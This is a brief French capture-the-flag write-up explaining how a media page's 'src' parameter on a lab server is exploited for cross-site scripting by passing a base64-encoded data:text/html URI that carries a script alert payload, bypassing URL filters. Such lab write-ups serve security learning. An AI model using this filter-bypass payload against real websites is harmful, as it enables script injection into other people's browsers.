# Objectif
Bypasser les filtres de l'url pour faire un XSS.

## Introduction 
En cliquant sur une image on tombe sur un lien: `http://10.171.55.130/?page=media&src=nsa`

On va modifier la partie src.

On encode `<script>alert(1)</script>` en base64 pour passer les checks à l'url. 
Ce qui donne un nouveau lien:
`http://10.171.55.130/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`

Ce qui nous donne le flag.